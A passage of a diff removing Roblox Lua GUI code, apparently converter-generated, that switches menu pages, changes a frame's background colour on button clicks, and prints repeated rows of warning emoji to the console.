-		script.Parent.Parent.page3.Visible = false
-		script.Parent.Parent.page4.Visible = true
-		script.Parent.Parent.page5.Visible = false
-	end)
-end;
-task.spawn(C_a0);
--- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-local function C_ac()
-local script = G2L["ac"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
-	end)
-end;
-task.spawn(C_ac);
--- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-local function C_b0()
-local script = G2L["b0"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-	end)
-end;
-task.spawn(C_b0);
--- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-local function C_b4()
-local script = G2L["b4"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
-	end)
-end;
-task.spawn(C_b4);
--- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-local function C_b8()
-local script = G2L["b8"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(85, 255, 0)
-	end)
-end;
-task.spawn(C_b8);
--- StarterGui.ScreenGui.Frame.page5.TextButton.LocalScript
-local function C_bc()
-local script = G2L["bc"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.Parent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-	end)
-end;
-task.spawn(C_bc);
--- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_c0()
-local script = G2L["c0"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.page1.Visible = false
-		script.Parent.Parent.page2.Visible = false
-		script.Parent.Parent.page3.Visible = false
-		script.Parent.Parent.page4.Visible = false
-		script.Parent.Parent.page5.Visible = true
-	end)
-end;
-task.spawn(C_c0);
--- StarterGui.ScreenGui.LocalScript
-local function C_c1()
-local script = G2L["c1"];
-	
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
-	print("⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️")
